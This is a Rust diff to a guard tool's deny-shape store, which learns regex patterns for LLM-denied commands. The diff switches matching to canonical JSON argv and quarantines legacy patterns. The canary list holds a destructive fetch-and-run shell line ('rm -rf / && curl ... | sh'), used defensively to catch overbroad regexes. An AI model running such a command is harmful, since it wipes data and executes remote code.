@@ -16,7 +16,8 @@
 //! Shapes are synthesized by the same LLM the evaluator already calls
 //! (`Evaluator::synthesize_deny_shape`), using the same tool-calling
 //! discipline as `guard verb create`: the model proposes a fully-anchored
-//! regex over the observed evidence, and `validate_deny_shape_safety` rejects
+//! regex over the canonical JSON argv encoding, and
+//! `validate_deny_shape_safety` rejects
 //! it before it is ever persisted or matched against.
 
 use anyhow::{bail, Context, Result};
@@ -46,11 +47,14 @@ use crate::redact::{
 /// technically-anchored pattern like `^.{0,20}$` would slip past a single
 /// long canary (it's short enough to never match it) while still matching
 /// almost any short evidence string, so short canaries close that gap.
+const CURRENT_VERSION: u32 = 2;
+const LEGACY_AMBIGUOUS_PATTERN: &str = r"^\[.*\]$";
+
 const OVERBROAD_ARGS_CANARIES: &[&str] = &[
-    "z",
-    "__unrelated_9f3d2a__",
-    "__unrelated_probe_of_medium_length_7c1e__",
-    "__guard_deny_shape_canary__; rm -rf / && curl http://x/y | sh #",
+    r#"["z"]"#,
+    r#"["__unrelated_9f3d2a__"]"#,
+    r#"["__unrelated_probe_of_medium_length_7c1e__"]"#,
+    r#"["__guard_deny_shape_canary__; rm -rf / && curl http://x/y | sh #"]"#,
 ];
 
 /// Evidence strings kept per observation bucket, for prompt context and for
@@ -88,7 +92,7 @@ impl DenyLearningConfig {
     }
 }
 
-#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct DenyShapeFile {
     #[serde(default = "default_version")]
     pub version: u32,
@@ -100,6 +104,20 @@ pub struct DenyShapeFile {
 
 fn default_version() -> u32 {
     1
+}
+
+fn is_false(value: &bool) -> bool {
+    !*value
+}
+
+impl Default for DenyShapeFile {
+    fn default() -> Self {
+        Self {
+            version: CURRENT_VERSION,
+            observations: BTreeMap::new(),
+            shapes: Vec::new(),
+        }
+    }
 }
 
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
@@ -123,8 +141,13 @@ pub struct DenyObservation {
 pub struct DenyShape {
     pub service: String,
     pub binary: String,
-    /// Fully anchored regex (`^...$`) over the space-joined argument string.
+    /// Fully anchored regex (`^...$`) over the canonical JSON argv array.
     pub args_pattern: String,
+    /// A migrated legacy matcher whose original flattened argv was ambiguous.
+    /// It conservatively denies the learned binary regardless of argv until an
+    /// operator clears or replaces the historical learning state.
+    #[serde(default, skip_serializing_if = "is_false")]
+    pub legacy_ambiguous: bool,
     pub denials: u32,
     pub synthesized_at_unix: u64,
     pub updated_at_unix: u64,
@@ -137,12 +160,12 @@ pub struct DenyShape {
 }
 
 impl DenyShape {
-    fn matches(&self, binary: &str, args_joined: &str) -> bool {
+    fn matches(&self, binary: &str, encoded_args: &str) -> bool {
         if !binary_matches(binary, &self.binary) {
             return false;
         }
         Regex::new(&self.args_pattern)
-            .map(|re| re.is_match(args_joined))
+            .map(|re| re.is_match(encoded_args))
             .unwrap_or(false)
     }
 }
@@ -211,13 +234,37 @@ impl DenyShapeStore {
             };
             let original_observations = data.observations.len();
             let original_shapes = data.shapes.len();
+            let stored_version = data.version;
             data.observations.retain(|_, observation| {
-                !deny_observation_contains_sensitive_literals(observation)
+                !deny_observation_contains_sensitive_literals(observation, stored_version)
             });
             data.shapes
-                .retain(|shape| !deny_shape_contains_sensitive_literals(shape));
+                .retain(|shape| !deny_shape_contains_sensitive_literals(shape, stored_version));
             let mut changed = original_observations != data.observations.len()
                 || original_shapes != data.shapes.len();
+            if data.version > CURRENT_VERSION {
+                bail!(
+                    "deny-shape schema version {} is newer than supported version {}",
+                    data.version,
+                    CURRENT_VERSION
+                );
+            }
+            if data.version < CURRENT_VERSION {
+                // Historical regexes were learned over space-joined argv and
+                // cannot be translated without inventing token boundaries.
+                // Preserve their deny-only authority conservatively as a
+                // binary-wide quarantine, and discard ambiguous observations
+                // so future synthesis starts from structured evidence.
+                data.observations.clear();
+                for shape in &mut data.shapes {
+                    shape.args_pattern = LEGACY_AMBIGUOUS_PATTERN.to_string();
+                    shape.legacy_ambiguous = true;
+                    shape.evidence_args.clear();
+                    shape.evidence.clear();
+                }
+                data.version = CURRENT_VERSION;
+                changed = true;
+            }
             for observation in data.observations.values_mut() {
                 let sanitized = sanitize_learning_text(&observation.last_reason);
                 changed |= sanitized != observation.last_reason;
@@ -273,8 +320,8 @@ impl DenyShapeStore {
     }
 
     /// Fast-path lookup: does an already-synthesized shape cover this
-    /// binary/args? `args_joined` must be built the same way the evaluator
-    /// splits a flattened command line (space-joined argv tail).
+    /// binary/argv? The matcher serializes argv itself so callers cannot
+    /// collapse or reinterpret element boundaries.
     ///
     /// Deliberately unconditional: this does not check `self.config.enabled`.
     /// `enabled` only gates whether new shapes get learned (`record_denial`);
@@ -282,11 +329,12 @@ impl DenyShapeStore {
     /// already on disk must not construct a `DenyShapeStore` for the
     /// evaluator at all (see `main.rs`, which only calls `EvalConfig::deny_shapes`
     /// when the flag is on).
-    pub fn matches(&self, binary: &str, args_joined: &str) -> Option<&DenyShape> {
+    pub fn matches(&self, binary: &str, args: &[String]) -> Option<&DenyShape> {
+        let encoded_args = canonical_argv(args);
         self.data
             .shapes
             .iter()
-            .find(|shape| shape.matches(binary, args_joined))
+            .find(|shape| shape.matches(binary, &encoded_args))
     }
 
     /// Bookkeeping only: record one LLM denial and report whether this bucket
@@ -330,7 +378,7 @@ impl DenyShapeStore {
         }
         let service = infer_service_from_binary(binary);
         let reason = sanitize_learning_text(reason);
-        let args_joined = args.join(" ");
+        let encoded_args = canonical_argv(args);
         let now = now_unix();
         let key = format!("{service}|{binary}");
         if !self.data.observations.contains_key(&key)
@@ -366,10 +414,10 @@ impl DenyShapeStore {
         observation.last_seen_unix = now;
         observation.last_command = command.to_string();
         observation.last_reason = reason.clone();
-        if !observation.evidence_args.contains(&args_joined)
+        if !observation.evidence_args.contains(&encoded_args)
             && observation.evidence_args.len() < MAX_EVIDENCE_PER_OBSERVATION
         {
-            observation.evidence_args.push(args_joined);
+            observation.evidence_args.push(encoded_args);
         }
 
         let denials = observation.denials;
@@ -412,7 +460,7 @@ impl DenyShapeStore {
     ) -> Result<()> {
         if evidence
             .iter()
-            .any(|args| flattened_args_contain_sensitive_literals(binary, args))
+            .any(|args| canonical_args_contain_sensitive_literals(binary, args))
         {
             bail!("deny shape evidence contains literal credential material");
         }
@@ -451,6 +499,7 @@ impl DenyShapeStore {
                 service: service.to_string(),
                 binary: binary.to_string(),
                 args_pattern: args_pattern.to_string(),
+                legacy_ambiguous: false,
                 denials,
                 synthesized_at_unix: now,
                 updated_at_unix: now,
@@ -500,26 +549,46 @@ impl DenyShapeStore {
     }
 }
 
-fn deny_observation_contains_sensitive_literals(observation: &DenyObservation) -> bool {
-    observation
-        .evidence_args
-        .iter()
-        .any(|args| flattened_args_contain_sensitive_literals(&observation.binary, args))
-        || flattened_command_contains_sensitive_literals(&observation.last_command)
+fn deny_observation_contains_sensitive_literals(
+    observation: &DenyObservation,
+    version: u32,
+) -> bool {
+    observation.evidence_args.iter().any(|args| {
+        if version >= CURRENT_VERSION {
+            canonical_args_contain_sensitive_literals(&observation.binary, args)
+        } else {
+            flattened_args_contain_sensitive_literals(&observation.binary, args)
+        }
+    }) || flattened_command_contains_sensitive_literals(&observation.last_command)
 }
 
-fn deny_shape_contains_sensitive_literals(shape: &DenyShape) -> bool {
+fn deny_shape_contains_sensitive_literals(shape: &DenyShape, version: u32) -> bool {
     text_contains_sensitive_literals(&shape.args_pattern)
-        || shape
-            .evidence_args
-            .iter()
-            .any(|args| flattened_args_contain_sensitive_literals(&shape.binary, args))
+        || shape.evidence_args.iter().any(|args| {
+            if version >= CURRENT_VERSION {
+                canonical_args_contain_sensitive_literals(&shape.binary, args)
+            } else {
+                flattened_args_contain_sensitive_literals(&shape.binary, args)
+            }
+        })
         || (!shape.evidence.is_empty()
             && (flattened_args_contain_sensitive_literals(&shape.binary, &shape.evidence)
                 || shape
                     .evidence
                     .split(" | ")
                     .any(|args| flattened_args_contain_sensitive_literals(&shape.binary, args))))
+}
+
+fn canonical_args_contain_sensitive_literals(binary: &str, encoded: &str) -> bool {
+    serde_json::from_str::<Vec<String>>(encoded)
+        .map(|args| command_contains_sensitive_literals(binary, &args))
+        .unwrap_or(true)
+}
+
+/// Collision-free persisted identity for one argv vector. JSON string escaping
+/// keeps element boundaries and control characters explicit and deterministic.
+pub fn canonical_argv(args: &[String]) -> String {
+    serde_json::to_string(args).expect("argv serialization cannot fail")
 }
 
 /// Reject a synthesized args pattern that isn't anchored, doesn't compile,
@@ -563,17 +632,6 @@ pub fn validate_deny_shape_safety(args_pattern: &str, evidence: &[String]) -> Re
     Ok(())
 }
 
-/// Split a flattened `binary arg1 arg2 ...` command line the same way
-/// `server::command_line` joins it, so the deny-shape matcher and the
-/// synthesizer see the same (binary, args_joined) split the rest of the
-/// codebase uses.
-pub fn split_command_line(command: &str) -> (&str, &str) {
-    match command.find(char::is_whitespace) {
-        Some(idx) => (&command[..idx], command[idx..].trim_start()),
-        None => (command, ""),
-    }
-}
-
 impl AsyncDurableStore for DenyShapeStore {
     fn authority_name(&self) -> &'static str {
         "deny-shape"
@@ -595,6 +653,18 @@ impl AsyncDurableStore for DenyShapeStore {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn argv(words: &[&str]) -> Vec<String> {
+        words.iter().map(|word| (*word).to_string()).collect()
+    }
+
+    fn encoded(words: &[&str]) -> String {
+        canonical_argv(&argv(words))
+    }
+
+    fn exact_pattern(words: &[&str]) -> String {
+        format!("^{}$", regex::escape(&encoded(words)))
+    }
 
     fn config(path: PathBuf, min_denials: u32) -> DenyLearningConfig {
         DenyLearningConfig {
@@ -698,8 +768,8 @@ mod tests {
             .promote_shape(
                 "kubernetes",
                 "kubectl",
-                "^delete pod$",
-                &["delete pod".to_string()],
+                &exact_pattern(&["delete", "pod"]),
+                &[encoded(&["delete", "pod"])],
                 "denied",
                 1,
             )
@@ -763,8 +833,8 @@ mod tests {
             .promote_shape(
                 "kubernetes",
                 "kubectl",
-                "^delete pod$",
-                &["delete pod".to_string()],
+                &exact_pattern(&["delete", "pod"]),
+                &[encoded(&["delete", "pod"])],
                 "safe",
                 1,
             )
@@ -776,7 +846,7 @@ mod tests {
                 "kubernetes",
                 "kubectl",
                 &contaminated_pattern,
-                &["delete pod".to_string()],
+                &[encoded(&["delete", "pod"])],
                 "ignored",
                 1,
             )
@@ -824,8 +894,8 @@ mod tests {
             .promote_shape(
                 "kubernetes",
                 "kubectl",
-                "^delete pod$",
-                &["delete pod".to_string()],
+                &exact_pattern(&["delete", "pod"]),
+                &[encoded(&["delete", "pod"])],
                 &reason,
                 1,
             )
@@ -874,19 +944,23 @@ mod tests {
             .promote_shape(
                 "kubectl",
                 "kubectl",
-                r"^delete namespace \S+$",
-                &["delete namespace prod".to_string()],
+                r#"^\["delete","namespace","[^"]+"\]$"#,
+                &[encoded(&["delete", "namespace", "prod"])],
                 "namespace deletion is destructive",
                 2,
             )
             .unwrap();
 
-        assert!(store.matches("kubectl", "delete namespace prod").is_some());
         assert!(store
-            .matches("kubectl", "delete namespace staging")
+            .matches("kubectl", &argv(&["delete", "namespace", "prod"]))
             .is_some());
-        assert!(store.matches("kubectl", "get pods").is_none());
-        assert!(store.matches("helm", "delete namespace prod").is_none());
+        assert!(store
+            .matches("kubectl", &argv(&["delete", "namespace", "staging"]))
+            .is_some());
+        assert!(store.matches("kubectl", &argv(&["get", "pods"])).is_none());
+        assert!(store
+            .matches("helm", &argv(&["delete", "namespace", "prod"]))
+            .is_none());
     }
 
     #[test]
@@ -902,19 +976,21 @@ mod tests {
             .promote_shape(
                 "kubectl",
                 "kubectl",
-                r"^delete namespace \S+$",
-                &["delete namespace prod".to_string()],
+                r#"^\["delete","namespace","[^"]+"\]$"#,
+                &[encoded(&["delete", "namespace", "prod"])],
                 "namespace deletion is destructive",
                 2,
             )
             .unwrap();
 
-        assert!(store.matches("kubectl", "delete namespace prod").is_some());
         assert!(store
-            .matches("/tmp/evil/kubectl", "delete namespace prod")
+            .matches("kubectl", &argv(&["delete", "namespace", "prod"]))
+            .is_some());
+        assert!(store
+            .matches("/tmp/evil/kubectl", &argv(&["delete", "namespace", "prod"]),)
             .is_none());
         assert!(store
-            .matches("KUBECTL.EXE", "delete namespace prod")
+            .matches("KUBECTL.EXE", &argv(&["delete", "namespace", "prod"]),)
             .is_some());
     }
 
@@ -931,7 +1007,7 @@ mod tests {
                 "kubectl",
                 "kubectl",
                 r"^.{0,20}$",
-                &["delete ns prod".to_string()],
+                &[encoded(&["delete", "ns", "prod"])],
                 "reason",
                 2,
             )
@@ -948,7 +1024,7 @@ mod tests {
                 "kubectl",
                 "kubectl",
                 r"delete namespace \S+",
-                &["delete namespace prod".to_string()],
+                &[encoded(&["delete", "namespace", "prod"])],
                 "reason",
                 2,
             )
@@ -965,7 +1041,7 @@ mod tests {
                 "kubectl",
                 "kubectl",
                 r"^.*$",
-                &["delete namespace prod".to_string()],
+                &[encoded(&["delete", "namespace", "prod"])],
                 "reason",
                 2,
             )
@@ -982,7 +1058,7 @@ mod tests {
                 "kubectl",
                 "kubectl",
                 r"^delete namespace staging$",
-                &["delete namespace prod".to_string()],
+                &[encoded(&["delete", "namespace", "prod"])],
                 "reason",
                 2,
             )
@@ -991,12 +1067,76 @@ mod tests {
     }
 
     #[test]
-    fn split_command_line_handles_no_args() {
-        assert_eq!(split_command_line("ls"), ("ls", ""));
-        assert_eq!(
-            split_command_line("kubectl delete pod foo"),
-            ("kubectl", "delete pod foo")
+    fn canonical_argv_preserves_argument_boundaries() {
+        assert_ne!(
+            canonical_argv(&argv(&["value with space"])),
+            canonical_argv(&argv(&["value", "with", "space"]))
         );
+        assert_eq!(canonical_argv(&[]), "[]");
+    }
+
+    #[test]
+    fn learned_shape_round_trip_preserves_one_argument_with_spaces() {
+        let temp = crate::learned_rules::authority_tempdir();
+        let config = config(temp.path().join("deny.yaml"), 1);
+        let one = argv(&["object with spaces"]);
+        let split = argv(&["object", "with", "spaces"]);
+        let evidence = canonical_argv(&one);
+        let mut store = DenyShapeStore::load(config.clone()).unwrap();
+        store
+            .promote_shape(
+                "fixture",
+                "fixturectl",
+                &format!("^{}$", regex::escape(&evidence)),
+                &[evidence],
+                "fixture denial",
+                2,
+            )
+            .unwrap();
+        assert!(store.matches("fixturectl", &one).is_some());
+        assert!(store.matches("fixturectl", &split).is_none());
+
+        let reloaded = DenyShapeStore::load(config).unwrap();
+        assert!(reloaded.matches("fixturectl", &one).is_some());
+        assert!(reloaded.matches("fixturectl", &split).is_none());
+    }
+
+    #[test]
+    fn legacy_flattened_shape_migrates_to_conservative_binary_quarantine() {
+        let temp = crate::learned_rules::authority_tempdir();
+        let path = temp.path().join("deny.yaml");
+        let legacy = DenyShapeFile {
+            version: 1,
+            observations: BTreeMap::new(),
+            shapes: vec![DenyShape {
+                service: "fixture".to_string(),
+                binary: "fixturectl".to_string(),
+                args_pattern: "^object with spaces$".to_string(),
+                legacy_ambiguous: false,
+                denials: 2,
+                synthesized_at_unix: 1,
+                updated_at_unix: 1,
+                last_reason: "fixture denial".to_string(),
+                evidence_args: vec!["object with spaces".to_string()],
+                evidence: String::new(),
+            }],
+        };
+        write_learning_file_atomically(&path, &serde_yaml_ng::to_string(&legacy).unwrap()).unwrap();
+
+        let loaded = DenyShapeStore::load(config(path.clone(), 1)).unwrap();
+        assert!(loaded
+            .matches("fixturectl", &argv(&["object with spaces"]))
+            .is_some());
+        assert!(loaded
+            .matches("fixturectl", &argv(&["object", "with", "spaces"]))
+            .is_some());
+        let migrated: DenyShapeFile =
+            serde_yaml_ng::from_slice(&std::fs::read(path).unwrap()).unwrap();
+        assert_eq!(migrated.version, CURRENT_VERSION);
+        assert!(migrated.observations.is_empty());
+        assert!(migrated.shapes[0].legacy_ambiguous);
+        assert_eq!(migrated.shapes[0].args_pattern, LEGACY_AMBIGUOUS_PATTERN);
+        assert!(migrated.shapes[0].evidence_args.is_empty());
     }
 
     #[test]
@@ -1053,13 +1193,23 @@ mod tests {
         let config = config(temp.path().join("deny.yaml"), 2);
         let mut first = DenyShapeStore::load(config.clone()).unwrap();
         let mut second = DenyShapeStore::load(config.clone()).unwrap();
-        let argv = ["remove".to_string(), "object".to_string()];
+        let command_argv = ["remove".to_string(), "object".to_string()];
 
         first
-            .record_denial("fixturectl", &argv, "fixturectl remove object", "unsafe")
+            .record_denial(
+                "fixturectl",
+                &command_argv,
+                "fixturectl remove object",
+                "unsafe",
+            )
             .unwrap();
         let outcome = second
-            .record_denial("fixturectl", &argv, "fixturectl remove object", "unsafe")
+            .record_denial(
+                "fixturectl",
+                &command_argv,
+                "fixturectl remove object",
+                "unsafe",
+            )
             .unwrap()
             .unwrap();
         assert_eq!(outcome.denials, 2);
@@ -1070,8 +1220,8 @@ mod tests {
             .promote_shape(
                 "fixturectl",
                 "fixturectl",
-                r"^remove object$",
-                &["remove object".to_string()],
+                &exact_pattern(&["remove", "object"]),
+                &[encoded(&["remove", "object"])],
                 "unsafe",
                 2,
             )
@@ -1080,8 +1230,8 @@ mod tests {
             .promote_shape(
                 "fixturectl",
                 "fixturectl",
-                r"^remove other$",
-                &["remove other".to_string()],
+                &exact_pattern(&["remove", "other"]),
+                &[encoded(&["remove", "other"])],
                 "unsafe",
                 2,
             )
@@ -1089,7 +1239,11 @@ mod tests {
 
         let loaded = DenyShapeStore::load(config).unwrap();
         assert_eq!(loaded.shape_count(), 1);
-        assert!(loaded.matches("fixturectl", "remove object").is_some());
-        assert!(loaded.matches("fixturectl", "remove other").is_none());
+        assert!(loaded
+            .matches("fixturectl", &argv(&["remove", "object"]))
+            .is_some());
+        assert!(loaded
+            .matches("fixturectl", &argv(&["remove", "other"]))
+            .is_none());
     }
 }
